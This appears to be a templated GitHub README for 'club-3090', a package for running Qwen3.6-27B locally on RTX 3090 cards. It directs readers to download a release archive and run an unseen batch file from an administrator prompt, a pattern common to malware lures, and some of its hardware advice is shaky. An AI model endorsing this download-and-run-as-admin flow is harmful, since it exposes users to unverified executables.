# ⚙️ club-3090 - Run powerful language models on hardware

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mariop4826/club-3090/releases)

Club-3090 lets you run advanced artificial intelligence models on your Nvidia RTX 3090 graphics card. This software provides the settings and tools needed to host these models locally on your own computer. You keep full control over your data because everything runs on your hardware instead of a remote server. 

This project supports multiple AI engines including vLLM, llama.cpp, and SGLang. These engines allow you to choose the best balance of speed and compatibility for your specific setup. We include pre-configured settings for the Qwen3.6-27B model designed for single or dual RTX 3090 card setups.

## 📋 System Requirements

To run this software, ensure your computer meets these minimum specifications:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Graphics Card**: NVIDIA RTX 3090. You need at least one card with 24GB of video memory.
*   **System RAM**: Minimum 32GB of system memory.
*   **Storage**: 50GB of free space on an NVMe SSD for storing model files.
*   **Drivers**: The latest NVIDIA Game Ready or Studio drivers.
*   **Software**: Docker Desktop installed and running in Windows.

If you use two graphics cards, ensure your power supply provides at least 1000W of consistent power to handle the high electrical demands of these cards during computation.

## 📥 Downloading the Software 

To begin, go to the official release page. You will find the latest version of the configuration package there.

[Download the latest files here](https://github.com/Mariop4826/club-3090/releases)

Click the link above to visit our release page. Look for the most recent version labeled at the top of the list. Download the compressed folder to your computer. Create a new folder on your desktop and extract all files from the download into this location. Ensure you have administrative rights on your machine to install any necessary components that the configuration files might trigger.

## 🛠️ Installation Steps

Follow these steps to prepare your environment:

1.  **Install Docker**: Most users find the easiest way to run these engines is through Docker Desktop. Download and install Docker Desktop from the official website. Ensure you enable the WSL 2 backend during the installation process.
2.  **Verify Drivers**: Open your NVIDIA GeForce Experience application. Check for updates to ensure you have the latest driver version. Old drivers often cause errors with modern AI engines.
3.  **Prepare the Path**: Place the extracted folder in a directory with no spaces in the name, such as C:\AI-Models. Spaces in file paths sometimes interfere with how the engines read configuration files.
4.  **Set Environment Variables**: If you use two graphics cards, the software needs to point to both units. Consult the documentation file inside your extracted folder to properly label your physical card IDs.

## 🚀 Running Your First Model

Once your environment is ready, you can start the model service.

1.  Open the Command Prompt as an administrator.
2.  Type `cd C:\AI-Models` and press Enter.
3.  Type `start-service.bat` and press Enter to launch the automation script.
4.  Wait for the console to report that the server is listening on port 8000. This process takes a few minutes on the first run because the software must verify the model files and warm up the graphics card memory.
5.  Open your preferred web browser and navigate to `http://localhost:8000`.

The browser will display the interface where you can interact with the Qwen3.6-27B model. You can now type your prompts and receive responses directly from your own hardware.

## 💡 Engine Selection Guide

The club-3090 repository gives you access to three different engines. Each serves a specific purpose:

*   **vLLM**: This engine provides the highest speed for multiple simultaneous users. Use this if you plan to connect other applications to your AI service. It is very efficient at managing video memory.
*   **llama.cpp**: This engine offers the best compatibility. If you notice errors with other engines, switch to this one. It runs well even if your system resources are limited.
*   **SGLang**: This is an experimental engine. It focuses on unique ways to generate text faster by organizing how the graphics card processes instructions. Use this if you want to experiment with the absolute limit of your hardware performance.

To switch engines, open the `config.ini` file in your main folder. Find the line that mentions "engine" and change the text to match your preference, then restart your batch file.

## ❓ Troubleshooting Common Issues

If the software fails to start, check the following items:

*   **Memory Errors**: If you see "Out of Memory" errors, your card does not have enough space for the selected model. Close other heavy applications like web browsers or video games before running the model.
*   **Connection Refused**: Ensure the Docker Desktop icon in your taskbar is green. If it is yellow or red, the underlying system is not ready. Click the icon to view the status log.
*   **Slow Speeds**: If the text generation feels slow, check your task manager. Ensure the workload is split across all available graphics card memory. If only one card is active, double-check your driver settings to ensure Multi-GPU support is enabled in the NVIDIA Control Panel.

The community members maintain this project to help everyone get the most out of their expensive hardware. If you encounter a new issue, check our issue tracker on the repository page to see if others found a solution for your specific hardware configuration.